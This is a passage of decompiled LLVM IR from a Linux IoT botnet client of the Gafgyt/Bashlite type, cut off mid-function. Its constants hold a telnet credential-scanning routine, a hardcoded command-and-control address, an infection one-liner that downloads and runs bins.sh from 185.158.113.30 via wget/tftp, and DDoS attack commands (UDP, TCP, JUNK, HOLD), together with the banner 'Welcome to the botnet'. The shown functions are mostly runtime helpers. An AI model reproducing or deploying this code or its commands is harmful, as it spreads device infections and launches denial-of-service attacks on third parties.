source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }

@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805510c.2 = global i32 0
@global_var_8055124.3 = local_unnamed_addr global i32* @global_var_805510c.2
@global_var_80540fc.4 = constant i32 0
@global_var_8055110.6 = local_unnamed_addr global i32 0
@global_var_80524fd.7 = constant [7 x i8] c"x86_32\00"
@global_var_805253a.12 = constant [8 x i8] c"UNKNOWN\00"
@global_var_8055440.13 = global i32 0
@global_var_8055444.14 = local_unnamed_addr global i32 0
@global_var_8055448.15 = local_unnamed_addr global i32 0
@global_var_805519c.16 = local_unnamed_addr global i32 4095
@global_var_8055198.17 = local_unnamed_addr global i32 362436
@global_var_8052542.18 = constant [7 x i8] c"(null)\00"
@global_var_8052549.20 = constant [3 x i8] c"-c\00"
@global_var_805254c.21 = constant [3 x i8] c"sh\00"
@global_var_805254f.22 = constant [8 x i8] c"/bin/sh\00"
@global_var_8052560.23 = constant i32 -1
@global_var_8052960.24 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805296e.25 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8055420.26 = local_unnamed_addr global i32 0
@global_var_8052977.27 = constant [5 x i8] c"PING\00"
@global_var_8055428.28 = local_unnamed_addr global i32 0
@global_var_805542c.29 = local_unnamed_addr global i32 0
@global_var_805b4a8.30 = local_unnamed_addr global i32 0
@global_var_805297c.31 = constant [6 x i8] c":>%$#\00"
@global_var_8052983.32 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805b4a0.33 = local_unnamed_addr global i32 0
@global_var_805298f.34 = constant [6 x i8] c"ogin:\00"
@global_var_8052995.35 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052998.36 = constant [9 x i8] c"assword:\00"
@global_var_80529a1.37 = constant [9 x i8] c"ncorrect\00"
@global_var_80523e2.38 = constant [14 x i8] c"sh || shell\0D\0A\00"
@global_var_80523f0.39 = constant [79 x i8] c"cd /var/ || cd /tmp/ || cd /var/run( || cd /var/tmp/ || cd /dev/ || cd /mnt/\0D\0A\00"
@global_var_8052440.40 = constant [125 x i8] c"busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\0D\0A\00"
@global_var_80524c0.41 = constant [61 x i8] c"busybox echo || echo nameserver 8.8.8.8 > /etc/resolv.conf\0D\0A\00"
@global_var_8055188.42 = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80523e2.38, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80523f0.39, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052440.40, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_80524c0.41, i32 0, i32 0)]
@global_var_8055194.43 = local_unnamed_addr global [61 x i8]* @global_var_80524c0.41
@global_var_805518c.44 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80523f0.39, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052440.40, i32 0, i32 0)]
@global_var_8055190.45 = local_unnamed_addr global [125 x i8]* @global_var_8052440.40
@global_var_80529d0.46 = constant [4 x i8] c"all\00"
@global_var_80529d4.47 = constant i32 2037579820
@global_var_80529d6.48 = constant [4 x i8] c"syn\00"
@global_var_80529da.49 = constant [4 x i8] c"rst\00"
@global_var_80529de.50 = constant [4 x i8] c"fin\00"
@global_var_80529e2.51 = constant [4 x i8] c"ack\00"
@global_var_80529e6.52 = constant [4 x i8] c"psh\00"
@global_var_80529ea.53 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_80529fc.54 = constant [6 x i8] c"PONG!\00"
@global_var_8052a02.55 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_8052a0d.56 = constant [10 x i8] c"My IP: %s\00"
@global_var_8052a17.57 = constant [5 x i8] c"HOLD\00"
@global_var_8052a1c.58 = constant [5 x i8] c"JUNK\00"
@global_var_8052a21.59 = constant [4 x i8] c"UDP\00"
@global_var_8052a25.60 = constant [4 x i8] c"TCP\00"
@global_var_8052a29.61 = constant [9 x i8] c"KILLATTK\00"
@global_var_8052a32.62 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_8055144.63 = local_unnamed_addr global i32 -1
@global_var_8052380.64 = constant [19 x i8] c"185.158.113.30:954\00"
@global_var_8055140.65 = global [19 x i8]* @global_var_8052380.64
@global_var_8052a3c.66 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8052a44.67 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8052a54.68 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8052a5f.70 = constant [6 x i8] c"-bash\00"
@global_var_8052a65.71 = constant i32 1831885595
@global_var_8052a74.73 = constant [46 x i8] c"%sWelcome to the botnet [%s:%s:%d cores] :)%s\00"
@global_var_8052aa2.74 = constant i32 1931804719
@global_var_8052aa4.75 = constant [38 x i8] c"%sCould not connect to commServer!%s\0A\00"
@global_var_8052aca.76 = constant [17 x i8] c"BUILD [%s:%s:%d]\00"
@global_var_8052adb.77 = constant [8 x i8] c"SCANNER\00"
@global_var_8052ae3.78 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_8052af4.79 = constant [4 x i8] c"OFF\00"
@global_var_805b4a4.80 = local_unnamed_addr global i32 0
@global_var_8052af8.81 = constant [17 x i8] c"SCANNER STOPPED!\00"
@global_var_8052b09.82 = constant [3 x i8] c"ON\00"
@global_var_8052b0c.83 = constant [28 x i8] c"attempting to start scanner\00"
@global_var_8052b28.84 = constant [17 x i8] c"SCANNER STARTED!\00"
@global_var_8052b39.85 = constant [5 x i8] c"PONG\00"
@global_var_8052b3e.86 = constant [4 x i8] c"DUP\00"
@global_var_8052b42.87 = constant [3 x i8] c"SH\00"
@global_var_8052b45.88 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8052b4d.89 = constant i32 1931804786
@global_var_8052b4f.90 = constant [3 x i8] c"%s\00"
@global_var_8052b52.91 = constant i32 32
@global_var_80551a4 = external local_unnamed_addr global i32
@global_var_8055200.94 = global i32 288
@global_var_8055250.95 = local_unnamed_addr global i32 272
@global_var_805b494.97 = global i32 0
@global_var_8053160.98 = constant i32 0
@global_var_80551c8.99 = global i32 0
@global_var_80551e0.100 = global i32 0
@global_var_80551c4.101 = local_unnamed_addr global i32* @global_var_8055200.94
@global_var_8053178.102 = constant [6 x i8] c"(nil)\00"
@global_var_805317e.103 = constant [7 x i8] c"(null)\00"
@global_var_8053185.104 = constant i32 2949163
@global_var_80531f2.106 = constant i32 327688
@global_var_80531ea.107 = constant [8 x i8] c" +0-#'I\00"
@global_var_8053198.108 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80531d5.109 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80531cb.110 = constant i32 117506048
@global_var_80531bc.111 = constant i32 331776
@global_var_8053240.112 = constant [8 x i8] c"Success\00"
@global_var_8053216.113 = constant [15 x i8] c"Unknown error \00"
@global_var_805b460.114 = global i32 0
@global_var_805b464.115 = global i32 0
@global_var_805b4c0.116 = global i32 0
@global_var_80552f0.117 = global i32 0
@global_var_805b56c.119 = global i32 0
@global_var_805b570.120 = local_unnamed_addr global i32 0
@global_var_805b574.121 = global i32 0
@global_var_805b580.122 = local_unnamed_addr global i32 0
@global_var_805b874.123 = global i32 0
@global_var_805b89c.124 = local_unnamed_addr global i32 0
@global_var_805b88c.125 = local_unnamed_addr global i32 0
@global_var_805b890.126 = local_unnamed_addr global i32 0
@global_var_805b894.127 = local_unnamed_addr global i32 0
@global_var_805b898.128 = local_unnamed_addr global i32 0
@global_var_805b8a4.129 = local_unnamed_addr global i32 0
@global_var_805b8b0.130 = local_unnamed_addr global i32 0
@global_var_805b8a8.131 = local_unnamed_addr global i32 0
@global_var_805b8b4.132 = local_unnamed_addr global i32 0
@global_var_805b888.133 = local_unnamed_addr global i32 0
@global_var_805b884.135 = local_unnamed_addr global i32 0
@global_var_805b8ac.136 = local_unnamed_addr global i32 0
@global_var_805b57c.137 = local_unnamed_addr global i32 0
@global_var_8055308.138 = global i32 0
@global_var_8055320.140 = global i32 0
@global_var_8055338 = external global i32
@global_var_8055364.142 = global i32 -1726662223
@global_var_8055340.143 = local_unnamed_addr global i32* @global_var_8055364.142
@global_var_805533c.144 = global i32* @global_var_8055364.142
@global_var_8053db4.145 = constant i32 0
@global_var_8053da0.146 = constant i32 0
@global_var_80553e0.147 = global i32 0
@global_var_805b478.148 = local_unnamed_addr global i32 0
@global_var_805b480.149 = local_unnamed_addr global i32 0
@global_var_8055100.151 = global i32 -1
@global_var_8050dbb.152 = constant i32 -294069
@global_var_805b488.153 = local_unnamed_addr global i32 0
@global_var_805b48c.154 = local_unnamed_addr global i32 0
@global_var_8054020.155 = constant [10 x i8] c"/dev/null\00"
@global_var_805b484.157 = local_unnamed_addr global i32 0
@global_var_805b47c.158 = local_unnamed_addr global i32 0
@global_var_805317d.159 = constant i32 1970153472
@global_var_80553f8.160 = local_unnamed_addr global i32* @global_var_805317d.159
@global_var_8050fa1.161 = constant i32 1928542531
@global_var_8050fc5.162 = constant i32 1928542531
@global_var_805b49c.163 = local_unnamed_addr global i32 0
@global_var_805403c.165 = constant [4 x i8] c"inf\00"
@global_var_805403f.170 = constant i32 1179535616
@global_var_805404c.171 = constant i32 2883630
@global_var_805b8b8.172 = local_unnamed_addr global i32 0
@global_var_805b8bc.173 = local_unnamed_addr global i32 0
@global_var_8055400.1 = local_unnamed_addr global i8 0
@global_var_8059440.19 = external local_unnamed_addr global i8*
@global_var_8055430.69 = external global i8*
@1 = internal constant [6 x i8] c"\1B[33m\00"
@global_var_8052a6b.72 = constant i8* getelementptr inbounds ([6 x i8], [6 x i8]* @1, i32 0, i32 0)
@global_var_805320a.105 = external constant i8*
@global_var_805b540.118 = global i8 0
@global_var_805b8a0.134 = local_unnamed_addr global i8 0
@global_var_805b474.139 = local_unnamed_addr global i8 0
@global_var_805b490.156 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 53367
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8055400.1, align 1024
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055124.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055124.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055124.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8055400.1, align 1024
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055124.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8055400.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_80540fc.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8055110.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134533841, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134554456, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getProperBinary() local_unnamed_addr {
entry:
  %v0_804818c = load i32, i32* @eax, align 4
  ret i32 %v0_804818c
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_80524fd.7 to i32)
}

define i32 @getCoresAmount() local_unnamed_addr {
entry:
  %v1_80481a2 = call i32 @sysconf(i32 84)
  ret i32 %v1_80481a2
}

define i32 @getEndianness() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_805253a.12 to i32)
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8055440.13, align 64
  %v1_804823a = add i32 %arg1, -1640531527
  store i32 %v1_804823a, i32* @global_var_8055444.14, align 4
  %v1_8048247 = add i32 %arg1, 1013904242
  store i32 %v1_8048247, i32* %eax.global-to-local, align 4
  store i32 %v1_8048247, i32* @global_var_8055448.15, align 8
  br label %dec_label_pc_804825a

dec_label_pc_804825a:                             ; preds = %entry, %dec_label_pc_804825a
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_804828a, %dec_label_pc_804825a ]
  %v1_8048260 = add nsw i32 %storemerge5, -3
  store i32 %v1_8048260, i32* %eax.global-to-local, align 4
  %v1_8048263 = mul nuw nsw i32 %v1_8048260, 4
  %v2_8048263 = add i32 %v1_8048263, ptrtoint (i32* @global_var_8055440.13 to i32)
  %v3_8048263 = inttoptr i32 %v2_8048263 to i32*
  %v4_8048263 = load i32, i32* %v3_8048263, align 4
  %v1_804826d = add nsw i32 %storemerge5, -2
  store i32 %v1_804826d, i32* %eax.global-to-local, align 4
  %v1_8048270 = mul nuw nsw i32 %v1_804826d, 4
  %v2_8048270 = add i32 %v1_8048270, ptrtoint (i32* @global_var_8055440.13 to i32)
  %v3_8048270 = inttoptr i32 %v2_8048270 to i32*
  %v4_8048270 = load i32, i32* %v3_8048270, align 4
  %v2_8048277 = xor i32 %v4_8048270, %v4_8048263
  %v2_804827c = xor i32 %storemerge5, -1640531527
  %v1_804827e = xor i32 %v2_804827c, %v2_8048277
  store i32 %v1_804827e, i32* %eax.global-to-local, align 4
  %v2_8048283 = mul nuw nsw i32 %storemerge5, 4
  %v3_8048283 = add i32 %v2_8048283, ptrtoint (i32* @global_var_8055440.13 to i32)
  %v4_8048283 = inttoptr i32 %v3_8048283 to i32*
  store i32 %v1_804827e, i32* %v4_8048283, align 4
  %v4_804828a = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_804828a, 4096
  br i1 %exitcond, label %dec_label_pc_8048296, label %dec_label_pc_804825a

dec_label_pc_8048296:                             ; preds = %dec_label_pc_804825a
  %v0_8048297 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8048297

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804825a, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80482b4 = load i32, i32* @global_var_805519c.16, align 4
  %v1_80482b9 = add i32 %v0_80482b4, 1
  %v1_80482ba = urem i32 %v1_80482b9, 4096
  store i32 %v1_80482ba, i32* @global_var_805519c.16, align 4
  %v1_80482c9 = mul nuw nsw i32 %v1_80482ba, 4
  %v2_80482c9 = add i32 %v1_80482c9, ptrtoint (i32* @global_var_8055440.13 to i32)
  %v3_80482c9 = inttoptr i32 %v2_80482c9 to i32*
  %v4_80482c9 = load i32, i32* %v3_80482c9, align 4
  %v7_80482e6 = udiv i32 %v4_80482c9, 228675
  store i32 %v7_80482e6, i32* @global_var_8055198.17, align 8
  br i1 true, label %dec_label_pc_8048336, label %dec_label_pc_8048328

dec_label_pc_8048328:                             ; preds = %entry
  br label %dec_label_pc_8048336

dec_label_pc_8048336:                             ; preds = %entry, %dec_label_pc_8048328
  store i32 %v1_80482ba, i32* @ecx, align 4
  %v1_804834b = mul nuw nsw i32 %v1_80482ba, 4
  %v2_804834b = add i32 %v1_804834b, ptrtoint (i32* @global_var_8055440.13 to i32)
  %v3_804834b = inttoptr i32 %v2_804834b to i32*
  %v4_804834b = load i32, i32* %v3_804834b, align 4
  ret i32 %v4_804834b

; uselistorder directives
  uselistorder i32 %v1_80482ba, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048336, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  %v0_804835b = load i32, i32* @edi, align 4
  store i32 %v0_804835b, i32* %stack_var_-8, align 4
  %v4_8048366 = ptrtoint i8* %tmp10 to i32
  %v3_8048377 = call i32 @_strlen(i8* %tmp10)
  %v1_804837e = add i32 %v3_8048377, -1
  br label %dec_label_pc_8048387

dec_label_pc_8048384:                             ; preds = %dec_label_pc_8048387
  %v4_8048384 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048387

dec_label_pc_8048387:                             ; preds = %entry, %dec_label_pc_8048384
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_8048384, %dec_label_pc_8048384 ]
  %v6_804838a = add i32 %stack_var_-16.0, %v4_8048366
  %v1_804838d = inttoptr i32 %v6_804838a to i8*
  %v2_804838d = load i8, i8* %v1_804838d, align 1
  %v2_804838f = sext i8 %v2_804838d to i32
  %v1_8048396 = call i32 @isspace(i32 %v2_804838f)
  %v1_804839e = icmp eq i32 %v1_8048396, 0
  %v1_80483a0 = icmp eq i1 %v1_804839e, false
  br i1 %v1_80483a0, label %dec_label_pc_8048384, label %dec_label_pc_80483a7.preheader

dec_label_pc_80483a7.preheader:                   ; preds = %dec_label_pc_8048387
  %v5_80483ad24 = icmp slt i32 %v1_804837e, %stack_var_-16.0
  br i1 %v5_80483ad24, label %dec_label_pc_80483ca, label %dec_label_pc_80483af.lr.ph

dec_label_pc_80483af.lr.ph:                       ; preds = %dec_label_pc_80483a7.preheader
  br label %dec_label_pc_80483af

dec_label_pc_80483a4:                             ; preds = %dec_label_pc_80483af
  %v5_80483a4 = add i32 %stack_var_-12.0.in25, -1
  %v5_80483ad = icmp slt i32 %v5_80483a4, %stack_var_-16.0
  br i1 %v5_80483ad, label %dec_label_pc_80483ca, label %dec_label_pc_80483af

dec_label_pc_80483af:                             ; preds = %dec_label_pc_80483af.lr.ph, %dec_label_pc_80483a4
  %stack_var_-12.0.in25 = phi i32 [ %v1_804837e, %dec_label_pc_80483af.lr.ph ], [ %v5_80483a4, %dec_label_pc_80483a4 ]
  %v6_80483b2 = add i32 %stack_var_-12.0.in25, %v4_8048366
  %v1_80483b5 = inttoptr i32 %v6_80483b2 to i8*
  %v2_80483b5 = load i8, i8* %v1_80483b5, align 1
  %v2_80483b7 = sext i8 %v2_80483b5 to i32
  %v1_80483be = call i32 @isspace(i32 %v2_80483b7)
  %v1_80483c6 = icmp eq i32 %v1_80483be, 0
  %v1_80483c8 = icmp eq i1 %v1_80483c6, false
  br i1 %v1_80483c8, label %dec_label_pc_80483a4, label %dec_label_pc_80483ca

dec_label_pc_80483ca:                             ; preds = %dec_label_pc_80483a4, %dec_label_pc_80483af, %dec_label_pc_80483a7.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_804837e, %dec_label_pc_80483a7.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_80483af ], [ %v5_80483a4, %dec_label_pc_80483a4 ]
  %v7_80483f218 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  br i1 %v7_80483f218, label %dec_label_pc_80483f4, label %dec_label_pc_80483d2

dec_label_pc_80483d2:                             ; preds = %dec_label_pc_80483ca, %dec_label_pc_80483d2
  %v6_80483fc20 = phi i32 [ %v6_80483fc, %dec_label_pc_80483d2 ], [ %v4_8048366, %dec_label_pc_80483ca ]
  %storemerge.in19 = phi i32 [ %v5_80483e9, %dec_label_pc_80483d2 ], [ %stack_var_-16.0, %dec_label_pc_80483ca ]
  %v6_80483e2 = add i32 %storemerge.in19, %v4_8048366
  %v1_80483e5 = inttoptr i32 %v6_80483e2 to i8*
  %v2_80483e5 = load i8, i8* %v1_80483e5, align 1
  %v3_80483e7 = inttoptr i32 %v6_80483fc20 to i8*
  store i8 %v2_80483e5, i8* %v3_80483e7, align 1
  %v5_80483e9 = add i32 %storemerge.in19, 1
  %v7_80483f2 = icmp sgt i32 %v5_80483e9, %stack_var_-12.0.in.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v2_80483fa = sub i32 %v5_80483e9, %stack_var_-16.0
  %v6_80483fc = add i32 %v2_80483fa, %v4_8048366
  br i1 %v7_80483f2, label %dec_label_pc_80483f4, label %dec_label_pc_80483d2

dec_label_pc_80483f4:                             ; preds = %dec_label_pc_80483d2, %dec_label_pc_80483ca
  %v6_80483fc.lcssa = phi i32 [ %v4_8048366, %dec_label_pc_80483ca ], [ %v6_80483fc, %dec_label_pc_80483d2 ]
  %v22_80483fc = inttoptr i32 %v6_80483fc.lcssa to i8*
  store i8 0, i8* %v22_80483fc, align 1
  %v3_8048402 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048402, i32* @edi, align 4
  ret i32 %v6_80483fc.lcssa

; uselistorder directives
  uselistorder i32 %v6_80483fc.lcssa, { 1, 0 }
  uselistorder i32 %v5_80483e9, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_80483a4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 2, 1, 0, 5, 4, 3, 6, 7, 8 }
  uselistorder i32 %v1_804837e, { 2, 1, 0 }
  uselistorder i32 %v4_8048366, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_80483d2, { 1, 0 }
  uselistorder label %dec_label_pc_80483ca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483af, { 1, 0 }
  uselistorder label %dec_label_pc_8048387, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804840d = icmp eq i32* %arg1, null
  br i1 %v4_804840d, label %dec_label_pc_804842c, label %dec_label_pc_8048413

dec_label_pc_8048413:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048416 = load i32, i32* %arg1, align 4
  %v3_804841b = inttoptr i32 %v2_8048416 to i8*
  store i8 %tmp8, i8* %v3_804841b, align 1
  %v2_8048420 = load i32, i32* %arg1, align 4
  %v1_8048422 = add i32 %v2_8048420, 1
  store i32 %v1_8048422, i32* @edx, align 4
  store i32 %v1_8048422, i32* %arg1, align 4
  br label %dec_label_pc_804843f

dec_label_pc_804842c:                             ; preds = %entry
  %v3_8048437 = bitcast i8* %stack_var_8 to i32*
  %v4_8048437 = call i32 @__libc_write(i32 1, i32* %v3_8048437, i32 1)
  br label %dec_label_pc_804843f

dec_label_pc_804843f:                             ; preds = %dec_label_pc_8048413, %dec_label_pc_804842c
  %v0_8048440 = phi i32 [ %tmp3, %dec_label_pc_8048413 ], [ %v4_8048437, %dec_label_pc_804842c ]
  ret i32 %v0_8048440

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804843f, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp23 = icmp slt i32 %arg3, 1
  br i1 %tmp23, label %dec_label_pc_80484a1, label %dec_label_pc_804845b

dec_label_pc_804845b:                             ; preds = %entry
  %v4_8048462 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8048462, i32* @edx, align 4
  %v2_804847354 = load i8, i8* %arg2, align 1
  %v3_804847355 = zext i8 %v2_804847354 to i32
  %v5_804847356 = and i32 %v4_8048462, -256
  %v6_804847357 = or i32 %v3_804847355, %v5_804847356
  %v4_804847558 = icmp eq i8 %v2_804847354, 0
  %v1_804847759 = icmp eq i1 %v4_804847558, false
  br i1 %v1_804847759, label %dec_label_pc_804846a, label %dec_label_pc_8048479

dec_label_pc_804846a:                             ; preds = %dec_label_pc_804845b, %dec_label_pc_804846a
  %v6_804847362 = phi i32 [ %v6_8048473, %dec_label_pc_804846a ], [ %v6_804847357, %dec_label_pc_804845b ]
  %v4_804847061 = phi i32 [ %v5_804846d, %dec_label_pc_804846a ], [ %v4_8048462, %dec_label_pc_804845b ]
  %stack_var_-12.060 = phi i32 [ %v4_804846a, %dec_label_pc_804846a ], [ 0, %dec_label_pc_804845b ]
  %v4_804846a = add i32 %stack_var_-12.060, 1
  %v5_804846d = add i32 %v4_804847061, 1
  %v22_804846d = inttoptr i32 %v5_804846d to i8*
  store i32 %v5_804846d, i32* @edx, align 4
  %v2_8048473 = load i8, i8* %v22_804846d, align 1
  %v3_8048473 = zext i8 %v2_8048473 to i32
